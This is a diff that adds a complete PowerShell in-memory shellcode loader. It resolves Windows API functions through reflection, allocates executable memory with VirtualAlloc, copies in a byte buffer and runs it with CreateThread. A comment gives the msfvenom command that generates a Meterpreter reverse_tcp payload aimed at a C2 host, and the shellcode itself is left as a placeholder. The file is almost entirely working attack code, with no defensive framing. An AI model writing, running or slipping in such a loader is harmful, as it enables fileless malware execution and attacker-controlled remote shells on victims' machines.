@@ -1,0 +1,50 @@
+#PowerShell script to load shellcode bytes directly into memory 
+
+function resolveFunc {
+
+Param ($targetDLL, $targetFunc)
+
+$asm = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+$tmp=@()
+
+$asm.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+
+return $tmp[0].Invoke($null, @(($asm.GetMethod('GetModuleHandle')).Invoke($null, @($targetDLL)), $targetFunc))
+
+}
+
+function getDelType {
+
+Param (
+
+[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+
+[Parameter(Position = 1)] [Type] $delType = [Void]
+
+)
+
+$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+
+$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+
+$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+
+return $type.CreateType()
+
+}
+
+$memSetup = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((resolveFunc kernel32.dll VirtualAlloc), (getDelType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+
+#**********
+#msfvenom --platform windows --arch x64 --format ps1 --payload windows/x64/meterpreter/reverse_tcp LHOST=<C2 IP> LPORT=<PORT> EXITFUNC=thread
+[Byte[]] $buf = <REPLACE ME WITH SHELLCODE BYTES>
+#**********
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $memSetup, $buf.length)
+
+$threadSetup =
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((resolveFunc kernel32.dll CreateThread), (getDelType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$memSetup,[IntPtr]::Zero,0,[IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((resolveFunc kernel32.dll WaitForSingleObject), (getDelType @([IntPtr], [Int32]) ([Int]))).Invoke($threadSetup, 0xFFFFFFFF)
